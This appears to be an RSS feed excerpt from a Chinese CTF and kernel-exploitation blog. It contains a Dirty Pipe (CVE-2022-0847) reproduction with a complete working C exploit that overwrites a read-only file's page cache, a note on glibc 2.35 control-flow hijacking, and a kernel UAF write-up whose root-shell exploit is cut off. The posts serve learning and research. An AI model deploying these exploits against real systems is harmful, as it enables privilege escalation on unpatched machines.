class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在上半部分的会验证待输入的内容和当前页内已输入的内容长度是否超过<code>PAGE_SIZE</code>，然后验证<code>buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE</code>如果通过则会进行copy操作。</p><p>如果未通过上半部分的验证则不会进入out，则会进入下方的for循环内，下面会新生成一个page，并且初始化buf</p><p><strong>注意：这里默认的<code>buf-&gt;flag = PIPE_BUF_FLAG_CAN_MERGE</code></strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="linux-内核page-cache机制"><a href="#linux-内核page-cache机制" class="headerlink" title="linux 内核page cache机制"></a>linux 内核page cache机制</h3><p>linux 通过将打开的文件放到缓存页之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。而我们通过该方法篡改了这个文件缓存页，则短时间内访问(读取)该文件的操作都会读到被我们篡改的文件缓存页上，完成利用。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><code>splice</code> 的零拷贝方法就是，直接用文件缓存页来替换<code>pipe</code> 中的缓存页(更改pipe缓存页指针指向文件缓存页)</p><p>这里漏洞出现在:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里在最后是将page直接赋值给了buf，并且未初始化flag。如果我们修改page为目标文件，并且没有修改flag，那么我们可以直接使用pipe_write进行写。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/641.jpeg"                                     ></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先生成管道，并使用write填满所有管道 (下面截图中第一个结构体为<code>pipe_inode_info</code>)</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122202208115.png"                      alt="image-20221122202208115"                ></p><ol start="2"><li>随后read出所有pipe，head和tail相等，清空pipe</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203439231.png"                      alt="image-20221122203439231"                ></p><ol start="3"><li>通过splice修改pipe-&gt;bufs-&gt;page指向文件缓存页</li><li>最后通过pipe_write写入内容</li></ol><h3 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a>综上，得出exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> data[] = <span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> data_size = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(p))</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(p[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] splice failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short splice!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] write failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short write!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203918963.png"                      alt="image-20221122203918963"                ></p><hr><p>总的来说，这个CVE的利用不算是很难，后续我会将复现环境都打包到github上</p><p>参考链接:</p><p><a class="link"   href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg" >https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://dirtypipe.cm4all.com/" >https://dirtypipe.cm4all.com/<i class="fas fa-external-link-alt"></i></a></p><p>打包链接:</p><p><a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。&lt;/p&gt;
&lt;p&gt;这个CV</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="零拷贝" scheme="https://cv196082.gitee.io/tags/%E9%9B%B6%E6%8B%B7%E8%B4%9D/"/>
    
    <category term="pipe" scheme="https://cv196082.gitee.io/tags/pipe/"/>
    
  </entry>
  
  <entry>
    <title>GLIBC 2.35 hook</title>
    <link href="https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/"/>
    <id>https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/</id>
    <published>2022-11-04T11:13:08.000Z</published>
    <updated>2022-11-04T11:22:49.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。</p><p>那么如果我们存在一个UAF漏洞但是只能申请size为0x20的chunk时就会显得十分窘迫，如果使用选择使用house of emma或者house of apple之类的攻击手法我们就需要花费大量的chunk来进行利用。</p><p>根据上述情况来说就目前我们已学的知识中可以使用exit_hook进行解决，不过就在今天在微信公众号中刷到一篇文章中提到了一篇文章，通过修改<code>_rtld_global._dl_ns._ns_loaded</code>实现劫持程序执行流。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/loader.png"                      alt="image-loader"                ></p><p>如上图所示，在通过exit函数或者程序正常退出时会调用fini_array中的函数</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221104180544894.png"                      alt="image-20221104180544894"                ></p><p>再从这张图中可以看到fini_array中的函数也正是<a href="https://cv196082.gitee.io/2022/03/07/house-of-banana/">house of banana</a>中提到的<code>_dl_fini</code>函数中调用的，并且可以看到是在</p><p><code>_rtld_global._dl_ns._ns_loaded</code>这个位置取出程序基地址，随后根据右边的偏移确定fini_array的位置，所以我们可以通过修改上述地址的内容到我们期望的位置即可劫持了。</p><hr><p>参考文章：<a class="link"   href="https://www.freebuf.com/articles/system/345968.html" >https://www.freebuf.com/articles/system/345968.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。&lt;/p&gt;
&lt;p&gt;那么如果我们存在一个UAF漏洞但</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="hook" scheme="https://cv196082.gitee.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>practice Ⅱ</title>
    <link href="https://cv196082.gitee.io/2022/10/19/practice2/"/>
    <id>https://cv196082.gitee.io/2022/10/19/practice2/</id>
    <published>2022-10-19T06:35:58.000Z</published>
    <updated>2022-10-19T06:36:00.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kernel-pwn1"><a href="#Kernel-pwn1" class="headerlink" title="Kernel pwn1"></a>Kernel pwn1</h2><p>题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开始一直在往复杂的想去了</p><p><strong>吐槽一下：为什么cpio格式的要用img结尾我挂载了很久挂载不上，知道file一看发现是cpio格式</strong></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">test1_open</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(inode *, file *))_fentry__)(inode, filp);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x20</span>LL);</span><br><span class="line">  length = <span class="number">0x20</span>;</span><br><span class="line">  test1_buffer = v2;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  used = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">test1_release</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( test1_buffer )</span><br><span class="line">    kfree(test1_buffer, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的漏洞点出在这个UAF上面（开始我还一直在找堆溢出）。因为没注意到在启动脚本中是没有开启kaslr的所以我在用<code>tty_struct</code>，<code>sk_buff</code>这些东西来泄漏基地址，然后泄漏栈地址完成栈迁移。但是发现这些结构体的文件都无法打开，然后仔细一看启动脚本发现并没有开启地址随机化，所以直接开搞就行。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里只需要<code>seq_operations</code>结构体即可，<a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 这篇文章中提到过这个结构体的使用，可以去看一下这里就不再赘述了。</p><p>题目比较简单直接放exp了</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        